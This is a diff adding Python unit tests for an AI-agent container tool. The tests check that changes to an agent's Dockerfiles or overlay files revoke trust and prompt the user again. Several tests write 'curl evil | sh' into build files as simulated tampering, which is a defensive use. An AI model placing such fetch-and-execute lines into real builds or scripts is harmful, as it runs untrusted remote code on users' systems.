@@ -312,5 +312,114 @@ class ProjectAgentsOnYourBottles(_Project):
         self.load_impl()
 
 
+_OVERLAY_DOCKERFILE_AGENT = ("---\nbottle: pi\nagent_provider:\n  harness: pi\n"
+                             "  overlay:\n    dockerfile: overlay/Dockerfile\n---\n")
+_OVERLAY_FILES_AGENT = ("---\nbottle: pi\nagent_provider:\n  harness: pi\n"
+                        "  overlay:\n    files: [tools/run.sh]\n---\n")
+_CUSTOM_DOCKERFILE_AGENT = ("---\nbottle: pi\nagent_provider:\n  harness: pi\n"
+                            "  dockerfile: agent.Dockerfile\n---\n")
+
+
+class ProjectAgentBuildInputs(_Project):
+    """A project agent's trust covers the files its image build takes from
+    the project, not only its `.md` (#813)."""
+
+    def setUp(self) -> None:
+        super().setUp()
+        self.agents = self.project / ".bot-bottle" / "agents"
+        self.agents.mkdir(parents=True)
+        (self.project / "overlay").mkdir()
+        self.overlay = self.project / "overlay" / "Dockerfile"
+        self.overlay.write_text("FROM ${BASE}\nRUN true\n")
+        (self.project / "tools").mkdir()
+        self.tool = self.project / "tools" / "run.sh"
+        self.tool.write_text("echo hi\n")
+        self.custom = self.project / "agent.Dockerfile"
+        self.custom.write_text("FROM debian\n")
+
+    def write_agent(self, frontmatter: str) -> None:
+        (self.agents / "pi.md").write_text(frontmatter)
+
+    def assert_change_asks_again(self, frontmatter: str, edit) -> None:  # type: ignore[no-untyped-def]
+        self.write_agent(frontmatter)
+        trust.trust(self.untrusted())
+        self.load()
+        self.load()  # an unchanged build context stays trusted
+        edit()
+        changed = self.untrusted()
+        self.assertIsNotNone(changed.previous)
+        self.assertIn("its build inputs changed", trust.prompt_text(changed))
+
+    def test_editing_the_overlay_dockerfile_asks_again(self) -> None:
+        self.assert_change_asks_again(
+            _OVERLAY_DOCKERFILE_AGENT,
+            lambda: self.overlay.write_text("FROM ${BASE}\nRUN curl evil | sh\n"))
+
+    def test_a_new_file_beside_the_overlay_dockerfile_asks_again(self) -> None:
+        # The Dockerfile's directory is its build context.
+        self.assert_change_asks_again(
+            _OVERLAY_DOCKERFILE_AGENT,
+            lambda: (self.project / "overlay" / "payload.sh").write_text("evil\n"))
+
+    def test_editing_an_overlay_file_asks_again(self) -> None:
+        self.assert_change_asks_again(
+            _OVERLAY_FILES_AGENT, lambda: self.tool.write_text("curl evil | sh\n"))
+
+    def test_editing_a_custom_dockerfile_asks_again(self) -> None:
+        self.assert_change_asks_again(
+            _CUSTOM_DOCKERFILE_AGENT,
+            lambda: self.custom.write_text("FROM debian\nRUN curl evil | sh\n"))
+
+    def test_files_outside_the_build_context_dont_count(self) -> None:
+        self.write_agent(_OVERLAY_DOCKERFILE_AGENT)
+        trust.trust(self.untrusted())
+        (self.project / "README.md").write_text("unrelated\n")
+        self.load()
+
+    def test_a_missing_input_appearing_later_asks_again(self) -> None:
+        self.tool.unlink()
+        self.write_agent(_OVERLAY_FILES_AGENT)
+        trust.trust(self.untrusted())
+        self.load()  # trusted while missing (the build would fail)
+        self.tool.write_text("curl evil | sh\n")
+        self.assertIsNotNone(self.untrusted().previous)
+
+    def test_a_symlink_out_of_the_project_is_refused_and_hashed_stably(self) -> None:
+        outside = self.project.parent / "outside.sh"
+        outside.write_text("one\n")
+        self.tool.unlink()
+        self.tool.symlink_to(outside)
+        self.write_agent(_OVERLAY_FILES_AGENT)
+        first = self.untrusted()
+        self.assertEqual(first.hash, self.untrusted().hash)
+        trust.trust(first)
+        outside.write_text("two\n")  # can't build either way: still trusted
+        self.load()
+
+    def test_trust_from_before_builds_were_covered_explains_the_reprompt(self) -> None:
+        self.write_agent(_OVERLAY_DOCKERFILE_AGENT)
+        path = self.agents / "pi.md"
+        old = trust.agent_hash("pi", path)  # the hash before #813
+        trust.trust(self.untrusted())
+        entry = trust.load_trusted()[0]
+        self.assertEqual(trust.SCHEME, entry.scheme)
+        trust._save([trust.Trusted(old, "pi", str(path), entry.grants,  # pylint: disable=protected-access
+                                   "2026-01-01")])
+        error = self.untrusted()
+        self.assertEqual(1, error.previous.scheme if error.previous else None)
+        self.assertIn("now also covers the files its image build takes",
+                      trust.prompt_text(error))
+
+    def test_agents_that_build_nothing_keep_their_old_trust(self) -> None:
+        self.write_agent(_PI_OWN_HOST)
+        path = self.agents / "pi.md"
+        # It replaces the user's `pi`, which its hash has always covered.
+        home_agent = self.home / ".bot-bottle" / "agents" / "pi.md"
+        context = trust.host_context("pi", home_agent=home_agent)
+        trust._save([trust.Trusted(trust.agent_hash("pi", path, context), "pi",  # pylint: disable=protected-access
+                                   str(path), (), "2026-01-01")])
+        self.load()
+
+
 if __name__ == "__main__":
     unittest.main()
